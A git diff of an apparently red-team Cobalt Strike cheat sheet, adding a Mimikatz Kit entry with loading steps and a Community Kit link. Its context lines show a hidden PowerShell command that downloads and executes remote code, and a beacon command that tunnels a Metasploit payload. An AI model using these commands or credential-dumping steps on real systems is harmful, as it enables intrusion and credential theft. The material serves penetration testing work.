@@ -36,6 +36,7 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Persistence Kit](#persistence-kit)
     * [Resource Kit](#resource-kit)
     * [Artifact Kit](#artifact-kit)
+    * [Mimikatz Kit](#mimikatz-kit)
 * [References](#references)
 
 
@@ -402,6 +403,8 @@ beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
 
 ## Kits
 
+* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike
+
 ### Elevate Kit
 
 UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)
@@ -462,6 +465,12 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
     * Change Import
 - Build the Artifact
 - Cobalt Strike -> Script Manager > Load .cna
+
+### Mimikatz Kit
+
+* Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)
+* Load the mimikatz.cna aggressor script
+* Use mimikatz functions as normal
 
 ## References
 
